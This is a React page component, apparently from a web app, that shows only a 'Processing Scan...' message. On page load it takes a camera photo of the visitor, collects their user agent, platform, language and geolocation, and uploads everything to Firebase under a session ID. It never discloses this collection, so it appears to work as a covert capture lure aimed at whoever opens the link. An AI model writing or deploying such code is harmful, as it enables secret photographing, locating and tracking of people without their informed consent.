import { useEffect } from "react";
import { useParams } from "react-router-dom";
import { getDownloadURL, ref, uploadBytes } from "firebase/storage";
import { db, storage } from "../firebaseConfig";
import { doc, updateDoc } from "firebase/firestore";

export default function ScanPage() {
  const { sessionId } = useParams();

  useEffect(() => {
    if (sessionId) captureData();
  }, [sessionId]);

  const captureData = async () => {
    try {
      const imageBlob = await takePhoto();
      const deviceInfo = getDeviceInfo();
      const location = await getLocation();
      const imageUrl = await uploadImage(imageBlob, sessionId);

      await updateDoc(doc(db, "sessions", sessionId), {
        imageUrl,
        deviceInfo,
        location,
        timestamp: new Date().toISOString(),
      });

      console.log("Data successfully captured and uploaded!");
    } catch (error) {
      console.error("Error capturing data:", error);
    }
  };

  const takePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const blob = await imageCapture.takePhoto();
      track.stop();
      return blob;
    } catch (error) {
      console.error("Error taking photo:", error);
      return null;
    }
  };

  const uploadImage = async (blob, sessionId) => {
    if (!blob) return null;
    try {
      const storageRef = ref(storage, `photos/${sessionId}.jpg`);
      await uploadBytes(storageRef, blob);
      return await getDownloadURL(storageRef);
    } catch (error) {
      console.error("Error uploading image:", error);
      return null;
    }
  };

  const getDeviceInfo = () => ({
    os: navigator.userAgent,
    browser: navigator.vendor || "Unknown",
    platform: navigator.userAgentData?.platform || navigator.userAgent,
    language: navigator.language,
  });

  const getLocation = async () => {
    return new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        (pos) =>
          resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
        () => resolve({ lat: "unknown", lon: "unknown" })
      );
    });
  };

  return (
    <div className="flex items-center justify-center h-screen bg-gray-100">
      <h2 className="text-xl font-semibold text-gray-700">
        Processing Scan...
      </h2>
    </div>
  );
}
